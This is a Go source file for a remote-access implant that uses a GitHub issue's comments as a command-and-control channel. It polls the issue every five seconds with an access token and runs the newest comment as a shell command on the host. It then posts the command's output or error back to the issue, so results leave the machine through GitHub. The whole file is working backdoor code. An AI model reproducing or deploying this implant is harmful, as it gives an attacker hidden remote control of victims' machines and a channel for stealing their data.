package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	access_token string
	commentURI   string
	repo_name    string
	owner        string
	issuenumber  string
	output       []map[string]interface{}
	cmd          string
)

func main() {
	owner = os.Args[1]
	repo_name = os.Args[2]
	access_token = os.Args[3]
	issuenumber = os.Args[4]
	var prev_command string
	prev_command = ""

	client := &http.Client{}

	fmt.Println("[+] Client Started!")

	for {

		time.Sleep(5 * time.Second)

		//reading command from github

		commentURI := "https://api.github.com/repos/" + owner + "/" + repo_name + "/issues/" + issuenumber + "/comments"

		req, _ := http.NewRequest("GET", commentURI, nil)
		req.Header.Add("Authorization", "Bearer "+access_token)
		req.Header.Add("Accept", "application/vnd.github+json")

		response, err := client.Do(req)

		if err != nil {
			fmt.Println("[-] Error in reading : ", err)
			return
		}

		body, _ := io.ReadAll(response.Body)
		json.Unmarshal(body, &output)

		if len(output) == 0 {
			fmt.Println("[*] No Command Receviced")
			continue
		}

		if prev_command != output[len(output)-1]["body"].(string) {

			fmt.Println("[+] Command Received : ", output[len(output)-1]["body"].(string))

			cmd = output[len(output)-1]["body"].(string)
			tokens := strings.Fields(cmd)

			result := exec.Command(tokens[0], tokens[1:]...)

			// Capture the output
			cmd_output, err := result.Output()
			if err != nil {
				fmt.Println("[-] Error in execution :", err.Error())
				BodyC2 := map[string]string{
					"body": err.Error(),
				}
				bodyC, _ := json.Marshal(BodyC2)
				req2, _ := http.NewRequest("POST", commentURI, bytes.NewBuffer(bodyC))
				req2.Header.Add("Authorization", "Bearer "+access_token)
				req2.Header.Add("Accept", "application/vnd.github+json")
				_, err3 := client.Do(req2)
				if err3 != nil {
					fmt.Println("[-] Error in wrting to github")
				}
				prev_command = err.Error()
				continue
			} else {
				fmt.Println("[+] Command Output : ", string(cmd_output))
			}

			//writing command output to github

			BodyC := map[string]string{
				"body": string(cmd_output),
			}
			bodyC, _ := json.Marshal(BodyC)

			req2, _ := http.NewRequest("POST", commentURI, bytes.NewBuffer(bodyC))
			req2.Header.Add("Authorization", "Bearer "+access_token)
			req2.Header.Add("Accept", "application/vnd.github+json")

			_, err2 := client.Do(req2)
			if err2 != nil {
				fmt.Println("[-] Error in execution :", err)
				continue
			} else {
				fmt.Println("[+] Output Written to gihub")
			}
			prev_command = string(cmd_output)
		} else {
			fmt.Println("[*] No Command Recevied")
		}
	}

}
